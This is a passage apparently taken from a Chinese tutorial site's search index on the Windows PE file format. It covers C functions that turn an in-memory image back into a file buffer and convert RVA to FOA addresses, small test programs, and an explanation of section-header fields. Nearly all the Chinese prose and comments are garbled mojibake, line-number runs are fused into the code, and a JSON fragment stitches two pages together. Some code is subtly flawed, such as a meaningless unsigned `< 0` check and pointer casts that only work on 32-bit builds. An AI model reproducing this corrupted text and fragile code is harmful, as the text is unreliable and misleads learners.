SizeOfImageBufferï¼šè¿”å›NewFileBufferçš„å¤§å°ï¼Œåœ¨å‡½æ•°ä¸­ç”¨SizeOfHeaders+æ‰€æœ‰èŠ‚.SizeOfRawDataç®—å‡ºæ¥çš„ è¿”å›å€¼ï¼š æˆåŠŸï¼Œè¿”å›NewFileBufferé¦–åœ°å€æŒ‡é’ˆ å¤±è´¥ï¼Œè¿”å›NULL*/void* ImageBufferToNewFileBuffer(const char* pBuffer, DWORD* SizeOfNewFileBuffer);1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &quot;ImageBufferToNewFileBuffer.h&quot;#include &lt;Windows.h&gt;void* ImageBufferToNewFileBuffer(const char* pBuffer, DWORD* SizeOfNewFileBuffer)&#123;\t//DOSå¤´\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PEå¤´\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//æ ‡å‡†PEå¤´\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//æ‰©å±•PEå¤´\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//èŠ‚è¡¨\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t//è®¡ç®—NewFileBufferå¤§å°ï¼Œä¸ºmallocåˆ†ç©ºé—´åšå‡†å¤‡\t*SizeOfNewFileBuffer = 0;\t*SizeOfNewFileBuffer += pImageOptionalHeader-&gt;SizeOfHeaders; //+SizeOfHeaders\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++) //ä¾æ¬¡+SizeOfRawData\t&#123; *SizeOfNewFileBuffer += pImageSectionHeader[i].SizeOfRawData;\t&#125;\tvoid* NewFileBuffer;\tNewFileBuffer = malloc((size_t)*SizeOfNewFileBuffer); //æŒ‰*SizeOfNewFileBufferç”³è¯·å¤§å°\tif (NewFileBuffer == NULL)\t&#123; perror(&quot;Error allocating memory for ImageBuffer&quot;); return NULL;\t&#125;\tmemset(NewFileBuffer, 0, (size_t)*SizeOfNewFileBuffer); //å¡«å……0\t//åˆ†å—æ‹·è´\t//1ã€æ‹·SizeOfHeaders\tmemcpy(NewFileBuffer, pBuffer, pImageOptionalHeader-&gt;SizeOfHeaders);\t//2ã€å¾ªç¯æ‹·èŠ‚æ•°æ®\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++)\t&#123; memcpy((void*)((DWORD)NewFileBuffer + pImageSectionHeader[i].PointerToRawData), (void*)((DWORD)pBuffer + pImageSectionHeader[i].VirtualAddress), pImageSectionHeader[i].SizeOfRawData);\t&#125;\treturn NewFileBuffer;&#125;æµ‹è¯•ï¼šinput.exe-&gt;ReadFileToFileBufferï¼Œå¾—åˆ°FileBuffer-&gt;FileBufferToImageBufferï¼Œå¾—åˆ°ImageBuffer-&gt;ImageBufferToNewFileBufferï¼Œå¾—åˆ°NewFileBuffer-&gt;MemoryToFileï¼Œå¾—åˆ°output.exeå¯¹input.exeè°ƒç”¨ReadFileToFileBufferåˆ›å»ºFileBufferè°ƒç”¨FileBufferToImageBufferå¯¹FileBufferåˆ›å»ºæ‹‰ä¼¸åçš„ImageBufferè°ƒç”¨ImageBufferToNewFileBufferå¯¹ImageBufferå‹ç¼©ï¼Œå½¢æˆNewFileBufferè°ƒç”¨MemoryToFileå¯¹NewFileBufferå­˜åˆ°ç£ç›˜ä¸Šoutput.exeä½¿ç”¨Beyond Compareè½¯ä»¶å¯¹æ¯”input.exeå’Œoutput.exeåå…­è¿›åˆ¶æ˜¯å¦å­˜åœ¨ä¸åŒ=&gt;æ¨å¯¼æ–¹æ³•ï¼šå¯¹æ¯”ä¸¤ä¸ªæ–‡ä»¶çš„MD5å€¼å¦‚æœéƒ½ä¸€æ ·ï¼Œåˆ™ImageBufferToNewFileBufferç¼–å†™æ­£ç¡®12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &quot;../CommonFiles/ReadFileToFileBuffer.h&quot;#include &quot;../CommonFiles/MemoryToFile.h&quot;#include &lt;stdio.h&gt; //printf perror#include &lt;stdlib.h&gt; //size_t free#include &quot;FileBufferToImageBuffer.h&quot;#include &quot;ImageBufferToNewFileBuffer.h&quot;//#include &lt;windef.h&gt; //BOOL?//#include &lt;winnt.h&gt; //PE relative struct//#include &lt;Windows.h&gt; //When you include windows.h it will, in turn, include winnt.h//#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\fg.exe&quot;//#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\fg_output.exe&quot;//#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\VC_HelloWorld.exe&quot;//#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\VC_HelloWorld_output.exe&quot;#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\VS_HelloWorld.exe&quot;#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\VS_HelloWorld_output.exe&quot;int main()&#123; //å°†æ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œåˆ›å»ºæ–‡ä»¶å†…å­˜æ˜ åƒFileBuffer size_t length; void* FileBuffer = ReadFileToFileBuffer(INPUT_FILE_PATH, &amp;length); if (NULL == FileBuffer) &#123; printf(&quot;ReadFileToFileBuffer failed &quot;); return 0; &#125; //FileBuffer-&gt;ImageBufferï¼Œæ‹‰ä¼¸ DWORD SizeOfImageBuffer; void* ImageBuffer; ImageBuffer = FileBufferToImageBuffer((char*)FileBuffer, &amp;SizeOfImageBuffer); if (NULL == ImageBuffer) &#123; printf(&quot;FileBufferToImageBuffer failed &quot;); free(FileBuffer); return 0; &#125; //ImageBuffer-&gt;NewFileBufferï¼Œå‹ç¼© DWORD SizeOfNewFileBuffer; void* NewFileBuffer; NewFileBuffer = ImageBufferToNewFileBuffer((char*)ImageBuffer, &amp;SizeOfNewFileBuffer); if (NULL == NewFileBuffer) &#123; printf(&quot;ImageBufferToNewFileBuffer failed &quot;); free(FileBuffer); return 0; &#125; //å°†å†…å­˜ä¸­çš„æ•°æ®å†™åˆ°æ–‡ä»¶ä¸­ if (!MemoryToFile((char*)NewFileBuffer, SizeOfNewFileBuffer, OUTPUT_FILE_PATH)) &#123; printf(&quot;MemoryToFile failed &quot;); free(FileBuffer); free(ImageBuffer); free(NewFileBuffer); return 0; &#125; // ä½¿ç”¨å®Œæ¯•åï¼Œé‡Šæ”¾å†…å­˜ free(FileBuffer); free(ImageBuffer); free(NewFileBuffer); return 0;&#125;æµ‹è¯•ç”¨ä¾‹æµ‹è¯•ç”¨çš„exeæ¥æºä»£è¡¨fg.exeé£é¸½ç¨‹åºæ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ï¼Œä¸å­˜åœ¨Misc&gt;SizeOfRawDataçš„èŠ‚VC_HelloWorld.exeVCç¼–è¯‘çš„32ä½Hello Worldç¨‹åºæ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ï¼Œå­˜åœ¨Misc&gt;SizeOfRawDataçš„èŠ‚VS_HelloWorld.exeVSç¼–è¯‘çš„32ä½Hello Worldç¨‹åºæ–‡ä»¶å¯¹é½â‰ å†…å­˜å¯¹é½ï¼Œå­˜åœ¨Misc&gt;SizeOfRawDataçš„èŠ‚fg.exeVC_HelloWorld.exeVS_HelloWorld.exeä¸å­˜åœ¨ä¸åŒæºæ–‡ä»¶æœ‰pdbè°ƒè¯•ä¿¡æ¯ï¼Œè°ƒè¯•ä¿¡æ¯æ˜¯åŠ åœ¨PEæ–‡ä»¶æœ«å°¾çš„ï¼Œå› æ­¤ç¨‹åºæ²¡æ³•æ‹·è´ã€‚è°ƒè¯•ä¿¡æ¯åœ¨ç¼–è¯‘æ—¶é€‰æ‹©ä¸ç”Ÿäº§è°ƒè¯•ä¿¡æ¯å»æ‰å°±è¡Œä½¿ç”¨å»æ‰è°ƒè¯•ä¿¡æ¯çš„VC_HelloWorld.exeä½œä¸ºè¾“å…¥ï¼Œå¯¹æ¯”è¾“å‡º.exeï¼Œä¸¤æ–‡ä»¶ä¸€æ ·ä¸å­˜åœ¨ä¸åŒ å¯å‘ï¼šæ–‡ä»¶å¤§å°=SizeOfHeaders+å„ä¸ªèŠ‚.SizeOfRawData+å¯èƒ½æœ‰çš„è°ƒè¯•ä¿¡æ¯ï¼ˆåœ¨æ–‡ä»¶å°¾ï¼‰ åœ°å€è½¬æ¢ RVAToFOA å°†RVAè½¬ä¸ºFOAåœ°å€ è¿‡ç¨‹è¿‡ç¨‹ï¼šRVAåœ°å€æ˜¯å¦ä½äºPEå¤´æˆ–è¯¥PEæ–‡ä»¶çš„FileAlignment=SectionAlignmentå¦‚æœæ˜¯ï¼Œé‚£ä¹ˆRVA=FOAï¼›å¦‚æœä¸æ˜¯ï¼Œè¯¥æ•°æ®çš„RVAä½äºå“ªä¸ªèŠ‚é€šè¿‡èŠ‚.VirtualAddress â‰¤ RVAåœ°å€ â‰¤ èŠ‚.VirtualAddress+å½“å‰èŠ‚å†…å­˜å¯¹é½åçš„å¤§å°ï¼Œæ¥åˆ¤æ–­è¯¥æ•°æ®åœ¨å“ªä¸ªèŠ‚ä¸­å·®å€¼ = RVAåœ°å€-èŠ‚.VirtualAddressï¼Œé‚£ä¹ˆFOA=èŠ‚.PointerToRawData+å·®å€¼Misc.VirtualSizeæ˜¯èŠ‚æ•°æ®åœ¨å†…å­˜ä¸­çœŸå®å±•å¼€çš„å€¼å‡½æ•°å£°æ˜å‡½æ•°å®ç°12345678910111213#pragma once#include &lt;Windows.h&gt;/*\tå‡½æ•°åŠŸèƒ½ï¼šå°†RVAåœ°å€è½¬æ¢ä¸ºFOAåœ°å€\tinputå‚æ•°ï¼š pBufferï¼šæ–‡ä»¶å†…å­˜æ˜ åƒé¦–åœ°å€ dwRVAï¼š è¦è½¬æ¢çš„RVAåœ°å€\tè¿”å›å€¼ï¼š dwRVAï¼šè½¬æ¢åçš„FOAåœ°å€ -1ä¸ºè½¬æ¢å¤±è´¥*/DWORD RVAToFOA(const char* pBuffer, DWORD dwRVA);123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdio.h&gt;#include &lt;Windows.h&gt;DWORD RVAToFOA(const char* pBuffer, DWORD dwRVA)&#123;\tDWORD dwFOA = -1;\tif (dwRVA &lt; 0) //å‚æ•°æ ¡éªŒ\t&#123; return dwFOA;\t&#125;\t//DOSå¤´\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PEå¤´\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//æ ‡å‡†PEå¤´\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//æ‰©å±•PEå¤´\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//èŠ‚è¡¨\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t//RVAåœ¨SizeOfHeadersä»¥å†… æˆ– FileAlignment==SectionAlignment æ—¶FOA=RVA\tif (dwRVA &lt;= pImageOptionalHeader-&gt;SizeOfHeaders || pImageOptionalHeader-&gt;FileAlignment == pImageOptionalHeader-&gt;SectionAlignment)\t&#123; dwFOA = dwRVA; return dwFOA;\t&#125;\t//åœ¨èŠ‚è¡¨ä¸­\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++)\t&#123; if (pImageSectionHeader[i].VirtualAddress &lt;= dwRVA &amp;&amp; dwRVA &lt; pImageSectionHeader[i].VirtualAddress + pImageSectionHeader[i].Misc.VirtualSize) &#123; //èŠ‚.PointerToRawData + å·®å€¼ //å·®å€¼=RVA-èŠ‚.VirtualAddress dwFOA = pImageSectionHeader[i].PointerToRawData + dwRVA - pImageSectionHeader[i].VirtualAddress; return dwFOA; &#125;\t&#125;\treturn dwFOA;&#125;éªŒè¯ç¨‹åºï¼šVS Codeç¼–è¯‘çš„Test.exeç¨‹åº1234567891011#include &lt;stdio.h&gt;int g = 0x12345678;int main()&#123; printf(&quot;Address : %p &quot;, &amp;g); printf(&quot;value : 0x%x &quot;, g); return 0;&#125;æ–‡ä»¶å¯¹é½æ˜¯200hï¼Œå†…å­˜å¯¹é½æ˜¯1000hRVAæ˜¯3010hï¼Œå†™ä¸ªæµ‹è¯•å‡½æ•°ï¼Œè®¡ç®—è¿™ä¸ªå˜é‡çš„FOA12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &quot;../CommonFiles/ReadFileToFileBuffer.h&quot;#include &quot;../CommonFiles/RVAToFOA.h&quot;#define FILE_PATH &quot;E:\\\\temp\\\\Test.exe&quot;int main()&#123; //å°†æ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œåˆ›å»ºæ–‡ä»¶å†…å­˜æ˜ åƒFileBuffer size_t length; void* FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (NULL == FileBuffer) &#123; printf(&quot;ReadFileToFileBuffer failed &quot;); return 0; &#125; //å°†RVAè½¬æ¢ä¸ºFOA DWORD dwFOA = RVAToFOA((char*)FileBuffer, 0x3010); if (dwFOA == -1) &#123; printf(&quot;RVAToFOA failed &quot;); return 0; &#125; printf(&quot;FOA: %p &quot;, dwFOA); // ä½¿ç”¨å®Œæ¯•åï¼Œé‡Šæ”¾å†…å­˜ free(FileBuffer); return 0;&#125;è¿è¡ŒåæŒ‰è¾“å‡ºçš„FOAåˆ°Test.exeä¸­å»æ‰¾ä¿®æ”¹ä¸º88888888ï¼Œå†æ¬¡è¿è¡ŒTest.exeï¼Œå€¼è¢«ä¿®æ”¹äº†è¯æ˜å°±æ˜¯æ­£ç¡®çš„"},{"title":"èŠ‚è¡¨","path":"/wiki/PE/èŠ‚è¡¨.html","content":"Section Headers ç´§è·Ÿåœ¨æ‹“å±•PEå¤´åçš„æ˜¯èŠ‚è¡¨ï¼ˆSection Tableï¼‰ï¼Œå®ƒæ˜¯ä¸ªç»“æ„ä½“æ•°ç»„ã€‚ç»“æ„ä½“IMAGE_SECTION_HEADERåŒ…å«äº†å®ƒæ‰€å…³è”çš„åŒºå—çš„ä¿¡æ¯ã€‚ 1234567891011121314151617typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 8å­—èŠ‚çš„ASCIIå­—ç¬¦ä¸²ï¼ˆèŠ‚åï¼‰ï¼Œå¯è‡ªå®šä¹‰ï¼Œåªæˆªå–8ä¸ªå­—èŠ‚ï¼Œå¯ä»¥8ä¸ªå­—èŠ‚éƒ½æ˜¯åå­— union &#123; // Miscï¼Œæ˜¯è¯¥èŠ‚åœ¨æ²¡æœ‰å¯¹é½å‰çš„çœŸå®å¤§å°ï¼Œè¯¥å€¼å¯ä»¥ä¸å‡†ç¡® DWORD PhysicalAddress; // çœŸå®å®½åº¦ï¼Œè¿™ä¸¤ä¸ªå€¼æ˜¯ä¸€ä¸ªè”åˆç»“æ„ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä¸­çš„ä»»ä½•ä¸€ä¸ª DWORD VirtualSize; // ä¸€èˆ¬æ˜¯å–åä¸€ä¸ª &#125; Misc; DWORD VirtualAddress; // åœ¨å†…å­˜ä¸­çš„åç§»åœ°å€ï¼ŒåŠ ä¸ŠImageBaseæ‰æ˜¯åœ¨å†…å­˜ä¸­çš„çœŸæ­£åœ°å€ DWORD SizeOfRawData; // èŠ‚åœ¨æ–‡ä»¶ä¸­å¯¹é½åçš„å¤§å° DWORD PointerToRawData; // èŠ‚åŒºåœ¨æ–‡ä»¶ä¸­çš„åç§» //è°ƒè¯•ç›¸å…³ DWORD PointerToRelocations; // åœ¨OBJæ–‡ä»¶ä¸­ä½¿ç”¨ï¼Œé‡å®šä½çš„åç§» DWORD PointerToLinenumbers; // è¡Œå·è¡¨çš„åç§»ï¼ˆä¾›è°ƒè¯•ç”¨ï¼‰ WORD NumberOfRelocations; // åœ¨OBJæ–‡ä»¶ä¸­ä½¿ç”¨ï¼Œé‡å®šä½é¡¹æ•°ç›® WORD NumberOfLinenumbers; // è¡Œå·è¡¨ä¸­è¡Œå·çš„æ•°ç›® DWORD Characteristics; // èŠ‚çš„å±æ€§&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; Nameï¼šSectionçš„åå­—ã€‚8ä½çš„ASCIIç å­—ç¬¦ä¸²æ•°ç»„ã€‚åå­—å¯ä»¥éšä¾¿æ”¹ã€‚å¦‚æœå—åè¶…è¿‡8å­—èŠ‚ï¼Œä¼šè¢«æˆªæ–­ï¼Œæ²¡æœ‰æœ€åçš„ç»ˆæ­¢æ ‡å¿—â€œNULLâ€å­—èŠ‚ã€‚ 1#define IMAGE_SIZEOF_SHORT_NAME 8 å¸¦æœ‰ä¸€ä¸ªâ€œ$â€çš„åŒºå—åä¼šè¢«é“¾æ¥å™¨ç‰¹æ®Šå¯¹å¾…ï¼Œå‰é¢æœ‰â€œ$â€çš„åŒååŒºå—ä¼šè¢«åˆå¹¶ã€‚è¿™äº›åŒºå—æ˜¯æŒ‰â€œ$â€åé¢çš„å­—ç¬¦çš„å­—æ¯é¡ºåºåˆå¹¶çš„ã€‚ åœ¨ç¼–ç¨‹è¿‡ç¨‹ä¸­ï¼Œè¯»å–PEæ–‡ä»¶ä¸­çš„ç›¸å…³å†…å®¹ï¼ˆä¾‹å¦‚è¾“å…¥è¡¨ã€è¾“å‡ºè¡¨ç­‰ï¼‰æ—¶ï¼Œä¸èƒ½å°†åŒºå—åç§°ä½œä¸ºå‚è€ƒã€‚æ­£ç¡®çš„æ–¹æ³•æ˜¯æŒ‰ç…§æ•°æ®ç›®å½•è¡¨ä¸­çš„å­—æ®µè¿›è¡Œå®šä½ã€‚ åŒºå—åç§°çš„è®¾å®šä¸»è¦æ˜¯ä¸ºäº†ä¾¿äºè¯†åˆ«å’Œä½¿ç”¨ï¼Œå¹¶ä¸å¯¹æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½äº§ç”Ÿå®è´¨æ€§å½±å“ã€‚å¾®è½¯ä¸ºè¿™äº›åŒºå—å®šä¹‰äº†ä¸€äº›å…·æœ‰ç‰¹è‰²çš„åç§°ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚ç„¶è€Œï¼Œè¿™äº›åç§°å®é™…ä¸Šåªæ˜¯ä½œä¸ºä¸€ä¸ªå‚è€ƒï¼Œå¯ä»¥æ ¹æ®éœ€è¦éšæ„æ›´æ”¹ã€‚ åç§° æè¿° .text é»˜è®¤çš„ä»£ç åŒºå—ï¼Œå®ƒçš„å†…å®¹å…¨æ˜¯æŒ‡ä»¤ä»£ç ã€‚PEæ–‡ä»¶è¿è¡Œåœ¨32ä½æ–¹å¼ä¸‹ï¼Œä¸å—16ä½æ®µçš„çº¦æŸ,æ‰€ä»¥æ²¡æœ‰ç†ç”±æŠŠä»£ç æ”¾åˆ°ä¸åŒçš„åŒºå—ä¸­ã€‚é“¾æ¥å™¨æŠŠæ‰€æœ‰ç›®æ ‡æ–‡ä»¶çš„.textå—é“¾æ¥æˆä¸€ä¸ªå¤§çš„.textå—ã€‚å¦‚æœä½¿ç”¨Borland C++ï¼Œå…¶ç¼–è¯‘å™¨å°†äº§ç”Ÿçš„ä»£ç å­˜å‚¨äºåä¸ºcodeçš„åŒºåŸŸï¼Œå…¶é“¾æ¥å™¨é“¾æ¥çš„ç»“æœæ˜¯ä½¿ä»£ç å—çš„åç§°ä¸æ˜¯.textï¼Œè€Œæ˜¯code .data é»˜è®¤çš„è¯»/å†™æ•°æ®åŒºå—ã€‚å…¨å±€å˜é‡ã€é™æ€å˜é‡ä¸€èˆ¬æ”¾åœ¨è¿™é‡Œ .rdata é»˜è®¤çš„åªè¯»æ•°æ®åŒºå—ï¼Œä½†ç¨‹åºå¾ˆå°‘ç”¨åˆ°è¯¥å—ä¸­çš„æ•°æ®ã€‚è‡³å°‘æœ‰ä¸¤ç§æƒ…å†µè¦ç”¨åˆ°.rdataå—ã€‚ä¸€æ˜¯åœ¨ Microsofté“¾æ¥å™¨äº§ç”Ÿçš„ EXE æ–‡ä»¶ä¸­ï¼Œç”¨äºå­˜æ”¾è°ƒè¯•ç›®å½•;äºŒæ˜¯ç”¨äºå­˜æ”¾è¯´æ˜å­—ç¬¦ä¸²ã€‚å¦‚æœç¨‹åºçš„DEF æ–‡ä»¶ä¸­æŒ‡å®šäº†DESCRIPTIONï¼Œå­—ç¬¦ä¸²å°±ä¼šå‡ºç°åœ¨.rdataå—ä¸­ .idata åŒ…å«å…¶ä»–å¤–æ¥DLLçš„å‡½æ•°åŠæ•°æ®ä¿¡æ¯ï¼Œå³è¾“äººè¡¨ã€‚å°†.idataåŒºå—åˆå¹¶åˆ°å¦ä¸€ä¸ªåŒºå—å·²æˆä¸ºæƒ¯ä¾‹ï¼Œå…¸å‹çš„æ˜¯.rdataåŒºå—ã€‚é“¾æ¥å™¨é»˜è®¤ä»…åœ¨åˆ›å»ºä¸€ä¸ªReleaseæ¨¡å¼çš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶æ‰å°†.idataåŒºå—åˆå¹¶åˆ°å¦ä¸€ä¸ªåŒºå—ä¸­ .edata è¾“å‡ºè¡¨ã€‚å½“åˆ›å»ºä¸€ä¸ªè¾“å‡ºAPIæˆ–æ•°æ®çš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œé“¾æ¥å™¨ä¼šåˆ›å»ºä¸€ä¸ª.EXPæ–‡ä»¶ï¼Œè¿™ä¸ª.EXPæ–‡ä»¶åŒ…å«ä¸€ä¸ª.edataåŒºå—ï¼Œå®ƒä¼šè¢«åŠ å…¥æœ€åçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ä¸.idataåŒºå—ä¸€æ ·ï¼Œ.edataåŒºå—ä¹Ÿç»å¸¸è¢«å‘ç°åˆå¹¶åˆ°äº†.textæˆ–.tdataåŒºå—ä¸­ .rsrc èµ„æºã€‚åŒ…å«æ¨¡å—çš„å…¨éƒ¨èµ„æºï¼Œä¾‹å¦‚å›¾æ ‡ã€èœå•ã€ä½å›¾ç­‰ã€‚è¿™ä¸ªåŒºå—æ˜¯åªè¯»çš„ï¼Œæ— è®ºå¦‚ä½•éƒ½ä¸åº”è¯¥å‘½åä¸º.rsreä»¥å¤–çš„åå­—ï¼Œä¹Ÿä¸èƒ½è¢«åˆå¹¶åˆ°å…¶ä»–åŒºå—é‡Œ .bss æœªåˆå§‹åŒ–æ•°æ®ã€‚å¾ˆå°‘ä½¿ç”¨ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯æ‰§è¡Œæ–‡ä»¶çš„.dataåŒºå—çš„VirtualSizeè¢«æ‰©å±•åˆ°è¶³å¤Ÿå¤§ä»¥å­˜æ”¾æœªåˆå§‹åŒ–çš„æ•°æ® .crt ç”¨äºæ”¯æŒC++è¿è¡Œæ—¶ï¼ˆCRTï¼‰æ‰€æ·»åŠ çš„æ•°æ® .tls TLSçš„æ„æ€æ˜¯çº¿ç¨‹å±€éƒ¨å­˜å‚¨å™¨ï¼Œç”¨äºæ”¯æŒé€šè¿‡_declspec ( thread)å£°æ˜çš„çº¿ç¨‹å±€éƒ¨å­˜å‚¨å˜é‡çš„æ•°æ®ï¼Œæ—¢åŒ…æ‹¬æ•°æ®çš„åˆå§‹åŒ–å€¼ï¼Œä¹ŸåŒ…æ‹¬è¿è¡Œæ—¶æ‰€éœ€çš„é¢å¤–å˜é‡ .reloc å¯æ‰§è¡Œæ–‡ä»¶çš„åŸºå€é‡å®šä½ã€‚åŸºå€é‡å®šä½ä¸€èˆ¬åªæ˜¯DLLéœ€è¦ï¼Œè€Œä¸æ˜¯EXEéœ€è¦ã€‚åœ¨Releaseæ¨¡å¼ä¸‹ï¼Œé“¾æ¥å™¨ä¸ä¼šç»™EXEæ–‡ä»¶åŠ ä¸ŠåŸºå€é‡å®šä½ï¼Œé‡å®šä½å¯ä»¥åœ¨é“¾æ¥æ—¶é€šè¿‡/FIXEDå¼€å…³å…³é—­ .sdata ç›¸å¯¹äºå…¨å±€æŒ‡é’ˆçš„å¯è¢«å®šä½çš„â€œçŸ­çš„â€è¯»/å†™æ•°æ®ï¼Œç”¨äºIA-64å’Œå…¶ä»–ä½¿ç”¨ä¸€ä¸ªå…¨å±€æŒ‡é’ˆå¯„å­˜å™¨çš„ä½“ç³»ç»“æ„ã€‚IA-64ä¸Šçš„å¸¸è§„å¤§å°çš„å…¨å±€å˜é‡æ”¾åœ¨è¿™ä¸ªåŒºå—é‡Œ .srdata ç›¸å¯¹äºå…¨å±€æŒ‡é’ˆçš„å¯è¢«å®šä½çš„â€œçŸ­çš„â€åªè¯»æ•°æ®ï¼Œç”¨äºIA-64å’Œå…¶ä»–ä½¿ç”¨ä¸€ä¸ªå…¨å±€æŒ‡é’ˆå¯„å­˜å™¨çš„ä½“ç³»ç»“æ„ .pdata å¼‚å¸¸è¡¨,åŒ…å«ä¸€ä¸ªCPUç‰¹å®šçš„IMAGE_RUNTIME_FUNCTION_ENTRYç»“æ„æ•°ç»„,DataDirectoryä¸­çš„IMAGE_DIRECTORY_ENTRY_EXCEPTION æŒ‡å‘å®ƒã€‚å®ƒç”¨äºå¼‚å¸¸å¤„ç†ï¼Œæ˜¯åŸºäºè¡¨çš„ä½“ç³»ç»“æ„ï¼Œå°±åƒIA-64ã€‚å”¯ä¸€ä¸ä½¿ç”¨åŸºäºè¡¨çš„å¼‚å¸¸å¤„ç†çš„æ¶æ„ä½“ç³»æ˜¯x86 .debug$S OBJæ–‡ä»¶ä¸­Codeviewæ ¼å¼çš„ç¬¦å·ã€‚è¿™æ˜¯ä¸€ä¸ªå˜é‡é•¿åº¦çš„Codeviewæ ¼å¼çš„ç¬¦å·è®°å½•æµ .debug$T OBJæ–‡ä»¶ä¸­Codeviewæ ¼å¼çš„ç±»å‹è®°å½•ã€‚è¿™æ˜¯ä¸€ä¸ªå˜é‡é•¿åº¦çš„Codeviewæ ¼å¼çš„ç±»å‹è®°å½•æµ .debug$P å½“ä½¿ç”¨é¢„ç¼–è¯‘çš„å¤´æ—¶,å¯ä»¥åœ¨OBJæ–‡ä»¶ä¸­æ‰¾åˆ°å®ƒ .drectve åŒ…å«é“¾æ¥å™¨å‘½ä»¤,åªèƒ½åœ¨OBJä¸­æ‰¾åˆ°å®ƒã€‚å‘½ä»¤æ˜¯èƒ½è¢«ä¼ é€’ç»™é“¾æ¥å™¨å‘½ä»¤è¡Œçš„å­—ç¬¦ä¸²,ä¾‹å¦‚â€œ-defaultlib:LIBC&quot;ã€‚å‘½ä»¤ç”¨ç©ºæ ¼å­—ç¬¦åˆ†å¼€ .didat å»¶è¿Ÿè½½å…¥çš„è¾“äººæ•°æ®ï¼Œåªèƒ½åœ¨éReleaseæ¨¡å¼çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­æ‰¾åˆ°ã€‚åœ¨Releaseæ¨¡å¼ä¸‹ï¼Œå»¶è¿Ÿè½½å…¥çš„æ•°æ®ä¼šè¢«åˆå¹¶åˆ°å¦ä¸€ä¸ªåŒºå—ä¸­ Miscï¼šè”åˆç»“æ„ã€‚ä¸€èˆ¬ç”¨çš„æ˜¯VirtualSizeæˆå‘˜ã€‚è¡¨ç¤ºåŒºå—çš„å®é™…å¤§å°ï¼ˆæœªå¯¹é½ï¼‰ï¼Œè¿™ä¸ªå€¼å¯ä»¥ä¸å‡†ç¡®ã€‚ è¿™ä¸ªå­—æ®µåœ¨OBJæ–‡ä»¶ä¸­è¢«è®¾ç½®ä¸º0ã€‚ VirtualAddressï¼šè¯¥åŒºå—è½½å…¥å†…å­˜åçš„RVAã€‚è¯¥åœ°å€%SectionAlignment=0ã€‚ åœ¨ Microsoftå·¥å…·ä¸­ï¼Œç¬¬1ä¸ªå—çš„é»˜è®¤RVAå€¼ä¸º1000hã€‚ åœ¨OBJä¸­ï¼Œè¯¥å­—æ®µæ²¡æœ‰æ„ä¹‰ï¼Œè¢«è®¾ç½®ä¸º0ã€‚ SizeOfRawDataï¼šè¯¥åŒºå—åœ¨ç£ç›˜æ–‡ä»¶ä¸­å¯¹é½åçš„å¤§å°ã€‚è¯¥å¤§å°%FileAlignment=0ã€‚ PointerToRawDataï¼šè¯¥å—åœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„åç§»ã€‚è¯¥åœ°å€%FileAlignment=0ã€‚ ç¨‹åºç»ç¼–è¯‘æˆ–æ±‡ç¼–åç”ŸæˆåŸå§‹æ•°æ®ï¼Œè¿™ä¸ªå­—æ®µç”¨äºç»™å‡ºåŸå§‹æ•°æ®åœ¨æ–‡ä»¶ä¸­çš„åç§»ã€‚å¦‚æœç¨‹åºè‡ªè£…è½½PEæˆ–COFFæ–‡ä»¶ï¼ˆè€Œä¸æ˜¯ç”±æ“ä½œç³»ç»Ÿè½½å…¥çš„)ï¼Œè¿™ä¸€å­—æ®µå°†æ¯”VirtualAddress 